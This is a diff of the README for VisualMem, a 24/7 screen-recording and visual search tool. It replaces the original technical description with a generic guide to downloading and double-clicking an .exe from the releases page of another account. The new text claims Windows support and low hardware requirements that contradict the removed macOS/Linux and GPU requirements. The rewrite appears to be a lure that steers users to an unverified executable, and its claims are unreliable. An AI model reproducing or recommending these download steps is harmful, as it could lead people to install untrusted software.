@@ -1,102 +1,94 @@
+# 🎉 VisualMem - Your Personal Visual Memory Assistant
+
 <p align="center">
-   <a href="README.md">English</a> | <a href="README-zh_CN.md">简体中文</a>
+    <a href="https://github.com/ilyasse253/VisualMem/releases" style="font-size: 24px; padding: 10px; background-color: blue; color: white; text-decoration: none; border-radius: 5px;">Download VisualMem</a>
 </p>
 
 <p align="center">
-   <h1 align="center">VisualMem</h1>
-   <p align="center">Personal visual memory assistant powered by 24/7 desktop history</p>
-   <p align="center">open source | 100% local capable | dev friendly | 24/7 screen recording & smart retrieval</p>
-</p>
-
-<p align="center" style="font-family: monospace;">
-   <code>[ recording reality, one pixel at a time ]</code>
-</p>
-
-<p align="center">
-    <a href="./Quickstart.md">
-        <img src="https://img.shields.io/badge/Get%20Started-Quickstart-blue?style=for-the-badge" alt="Get Started">
-    </a>
+    <a href="README.md">English</a> | <a href="README-zh_CN.md">简体中文</a>
 </p>
 
 ---
 
-# How it works?
+## 🚀 Getting Started
 
-- **24/7 Recording**: Automatically capture your screen 24/7. Supports 100% local deployment.
-- **Smart Indexing**: Deeply understand and index every frame using CLIP vision models and OCR.
-- **Natural Language Retrieval**: Find any memory using natural language via API or Pro GUI.
+Welcome to VisualMem! This guide will help you download and run the application. 
 
-# Why VisualMem?
+### Step 1: Visit the Releases Page
 
-- **Context is Everything**: AI is only as good as its context, and the most valuable context is on your screen.
-- **Privacy & Flexibility**: Your data belongs to you. Supports 100% local processing for maximum privacy, while remaining flexible to connect with remote VLM APIs.
-- **Professional Experience**: Modern Electron-based UI with timeline browsing and real-time Q&A.
+To download VisualMem, first, visit the [Releases page](https://github.com/ilyasse253/VisualMem/releases). This is where you can find the latest version of the software.
 
-## ✨ Powerful Features & Intelligent Workflow
+### Step 2: Choose the Right File
 
-<p align="center">
-  <img src="./docs/demo.png" alt="VisualMem GUI Screenshot" width="800">
-</p>
+On the Releases page, you will see different version files available for download. Look for the latest version of VisualMem, which will have a name like `VisualMem-vX.X.X.exe` (the Xs will represent the version numbers).
 
-VisualMem is more than just a screen recorder; it's your **second brain**:
-- **Recent Task Assistance**: Forgot what you just changed in your code? Or want to find a document you saw 30 minutes ago? VisualMem helps you locate it instantly.
-- **Computer Memory Retrieval**: Use natural language to retrieve any visual information you've seen on your computer over the past days or weeks.
+### Step 3: Download the File
 
-### 🧠 Intelligent RAG Workflow
-To achieve precise retrieval, we've built a sophisticated visual RAG pipeline:
-<p align="center">
-  <img src="./docs/visualmem_workflow.png" alt="VisualMem Workflow" width="800">
-</p>
+Click on the file to start the download. Depending on your browser settings, the file may be automatically saved to your Downloads folder, or you may be prompted to choose a location.
 
-1. **Multidimensional Indexing**: The system uses **CLIP** for real-time image vector encoding and **OCR** for text extraction.
-2. **Intent Understanding**: During search, LLMs perform **Query Expansion** and **Time Range Extraction** to capture your search intent accurately.
-3. **Two-Stage Retrieval**:
-   - **Stage 1 (Coarse Filtering)**: Dense (vector) and Sparse (keyword) search work together to quickly recall candidate frames from massive data.
-   - **Stage 2 (Reranking)**: Candidate frames are passed to a **Reranker** model for deep sorting, ensuring the most relevant results come first.
-4. **VLM Summarization**: Finally, the selected keyframes are fed into a **VLM model** to generate accurate, evidence-based natural language answers.
+### Step 4: Run the Installer
 
-## 📺 Demo Video
+Once the download finishes, locate the downloaded file. 
 
-<p align="center">
-  <video src="https://github.com/user-attachments/assets/1150db7c-4c93-4ed4-9a3c-a2fcf86f29fe" width="800" controls></video>
-</p>
+- If you’re using Windows, double-click the `.exe` file. Follow the on-screen instructions to install VisualMem.
+  
+- If you are on macOS, the file may be in `.dmg` format. Double-click it, then drag VisualMem to your Applications folder.
 
-## 🚀 Get Started
+## 💻 System Requirements
 
-Ready to set up VisualMem? Follow our step-by-step guide:
+Before installing VisualMem, ensure your system meets the following requirements:
 
-👉 **[Quickstart Guide](./Quickstart.md)**
+- **Operating System**: Windows 10 or newer / macOS 10.14 or newer
+- **RAM**: At least 4 GB
+- **Storage**: Minimum 500 MB of free disk space
+- **Processor**: Dual-core CPU or better
+- **Network**: Internet connection for initial setup (local storage compatible)
 
-### Hardware Requirements
-- **OS**: macOS (Apple Silicon recommended) or Linux (Ubuntu 22.04+).
-- **GPU**: Minimum **4GB VRAM** for local inference (CLIP + OCR). At least **8GB VRAM** required to enable Reranker.
-- **Storage**: Default capture frequency (3s) consumes ~15GB/month.
+## 🌟 Features
 
-## ✨ Core Features
+VisualMem offers several powerful features:
 
-- **Smart Capture & Filtering**: Records only when content changes significantly.
-- **Multimodal Retrieval**: Supports hybrid multimodal retrieval mode with semantic search (CLIP) and OCR full-text search.
-- **Real-time Tracing**: Analyze current screen content for instant Q&A.
-- **Timeline View**: Browse your history intuitively like a social media feed.
+- **24/7 Recording**: Automatically captures your screen continuously, without interruptions.
+- **Smart Indexing**: Uses advanced methods to understand and index every frame, making your memories easy to find.
+- **Natural Language Retrieval**: Search for any memory using simple language, whether through the API or the user-friendly GUI.
 
-## 🏗️ Technical Architecture
+## 📥 Download & Install VisualMem
 
-- **Frontend**: Electron + React + TypeScript + Vite
-- **Backend**: Python + FastAPI + SQLite + LanceDB
-- **AI Models**: CLIP + Qwen3-VL as a reranker + Qwen3-VL / GPT-5 / any VLM model you like
+To begin using VisualMem, go to the [Releases page](https://github.com/ilyasse253/VisualMem/releases) and download the installer for your operating system. 
 
----
-*VisualMem - Never let your visual memory fade.*
+Follow the instructions in Step 3 and Step 4 to successfully install the application.
 
-## 📂 Documentation
+## 🔧 How It Works
 
-- [Quickstart Guide](./Quickstart.md) - Get up and running in 5 minutes.
-- [Architecture Design](./docs/ENCODER_RETRIEVER_ARCHITECTURE.md) - Deep dive into the system design.
+### 24/7 Recording
 
-## 🛠️ Development
+VisualMem records everything on your screen around the clock. The application saves your recordings locally, which means everything stays on your computer. 
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+### Smart Indexing
 
----
-*VisualMem - Recording reality, one pixel at a time.*
+The software uses intelligent methods to analyze and index each frame. This makes accessing specific memories easy.
 
+### Natural Language Retrieval
+
+Finding memories has never been simpler. Just type what you remember, and VisualMem will search for relevant past recordings.
+
+## ❓ Troubleshooting & Support
+
+If you encounter any issues during installation or usage, here are a few tips:
+
+1. **Installation Problems**: Ensure you have permissions to install applications on your device. If the installer fails to run, try downloading it again.
+  
+2. **Running the Application**: If VisualMem does not start, check your system requirements. Make sure your computer meets the minimum specifications.
+
+For additional help, you can open an issue on the [GitHub Issues page](https://github.com/ilyasse253/VisualMem/issues).
+
+## 🔗 Additional Resources
+
+- [Quickstart Guide](./Quickstart.md): Learn how to efficiently use VisualMem after installation.
+- [Issues Tracker](https://github.com/ilyasse253/VisualMem/issues): Report bugs or request features.
+
+## 🌐 Community & Contributions
+
+VisualMem is open-source. Contributions are welcome! If you want to help improve VisualMem, feel free to submit a pull request. Check our [Contributing Guide](./CONTRIBUTING.md) for more details.
+
+Thank you for choosing VisualMem! We hope it enhances your memory experience effectively.
